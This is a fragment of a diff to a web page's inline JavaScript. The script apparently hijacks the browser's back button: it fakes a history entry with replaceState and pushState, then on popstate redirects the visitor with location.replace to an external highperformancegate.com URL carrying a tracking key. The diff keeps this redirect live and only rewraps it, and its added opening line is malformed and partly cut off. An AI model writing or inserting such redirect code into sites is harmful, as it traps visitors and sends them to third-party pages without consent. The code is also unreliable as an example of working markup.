@@ -1,4 +1,5 @@
-<script type="text/javascript" language="javascript">
+type='text/javascript'>
+//<![CDATA[
 (function(window, location) {
 history.replaceState(null, document.title, location.pathname+"#!/history");
 history.pushState(null, document.title, location.pathname);
@@ -12,4 +13,4 @@ location.replace("https://www.highperformancegate.com/d7ha27e5?key=3e13d68a557a3
 }
 }, false);
 }(window, location));
-</script>
+//]]>
